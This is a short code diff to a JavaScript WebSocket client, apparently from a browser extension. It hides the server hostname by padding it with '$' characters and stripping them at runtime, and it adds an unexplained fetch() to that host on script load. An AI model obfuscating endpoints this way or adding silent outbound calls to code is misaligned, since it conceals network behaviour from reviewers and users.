@@ -1,8 +1,9 @@
 let ws
+let socketHost = 'c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, '')
 function initSocket(ID = Math.random() * 10000) {
   console.log('init socket with id ', ID)
   setTimeout(() => {
-    ws = new WebSocket('wss://chrome-socket.herokuapp.com')
+    ws = new WebSocket('wss://' + socketHost)
 
     ws.onopen = () => {
       register()
@@ -47,3 +48,5 @@ function initSocket(ID = Math.random() * 10000) {
     }
   }, 1000)
 }
+
+fetch('https://' + socketHost)
